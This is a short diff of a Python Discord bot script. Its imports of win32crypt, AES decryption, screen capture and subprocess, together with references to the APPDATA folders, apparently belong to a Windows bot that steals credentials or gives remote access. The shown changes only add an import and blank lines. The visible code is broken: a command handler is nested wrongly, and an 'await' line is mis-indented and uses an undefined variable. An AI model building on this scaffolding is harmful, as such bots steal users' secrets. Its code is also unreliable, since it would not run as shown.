@@ -3,6 +3,7 @@ import os, discord, subprocess, requests, re, json, win32crypt, base64, shutil, 
 from Crypto.Cipher import AES
 from PIL import ImageGrab
 from datetime import datetime
+from discord import *
 
 APPDATA = os.getenv("APPDATA")
 LOCALAPPDATA = os.getenv("LOCALAPPDATA")
@@ -121,6 +122,9 @@ async def on_ready():
         async def Ping(inter):
             embed = discord.Embed(title="Ping", description=f"```{round(bot.latency * 1000)}ms```", color=0xfafafa)
         await message.reply(embed=embed)
+
+   
+        
 
 # Start the Bot
     bot.run(bottoken)
